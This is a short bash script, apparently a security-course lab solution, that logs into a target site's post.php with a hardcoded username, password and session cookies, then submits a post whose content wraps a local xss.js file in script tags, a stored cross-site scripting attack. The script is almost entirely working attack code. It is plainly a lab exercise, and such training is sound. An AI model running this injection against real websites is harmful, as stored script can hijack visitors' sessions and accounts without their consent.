#!/bin/bash

if [ $# -ne 1 ]
then
echo "Usage: $0 <url>"
exit 1
fi


dir=$(dirname "$1")
base=$(basename "$1")

# Q3.c
response1=$(curl -i "$1/post.php" \
-H 'Content-Type: application/x-www-form-urlencoded' \
-H 'Cookie: _ga=GA1.2.491559635.1677012521; _gid=GA1.2.1184802545.1677012521; _gcl_au=1.1.1170839619.1677012521; CS458=k9fnkdji1oukchqnnvo939tmh5' \
-d 'username=alice&password=Password123&form=login')

# Q3.a,b
response2=$(curl -i "$1/post.php" \
-H 'Content-Type: application/x-www-form-urlencoded' \
-H 'Cookie: _ga=GA1.2.491559635.1677012521; _gcl_au=1.1.1170839619.1677012521; CS458=k9fnkdji1oukchqnnvo939tmh5' \
-d 'title=Q3 XSS&type=1&form=content&submit=' \
--data-urlencode "content=<script>$(cat xss.js | tr '\n' ' ')</script>")


echo "$response1"$'\n\n'"$response2" > response.txt
echo "$response1"$'\n\n'"$response2"